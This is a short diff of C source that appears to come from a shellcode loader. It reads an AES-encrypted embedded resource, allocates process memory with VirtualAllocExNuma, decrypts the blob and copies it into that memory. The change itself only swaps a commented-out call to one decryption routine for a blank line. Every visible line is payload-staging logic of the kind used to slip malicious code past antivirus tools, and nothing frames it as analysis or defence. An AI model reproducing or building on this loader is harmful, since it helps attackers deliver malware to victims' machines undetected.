@@ -38,7 +38,7 @@ int main() {
     laddrems("AESCODE", &AESCode, &AESCodeLen);
 
     LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
-    //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
+    
     xdecman(AESCode, AESCodeLen, AESkey , AESkeyLen);
 
     memcpy(memalo, AESCode, AESCodeLen);
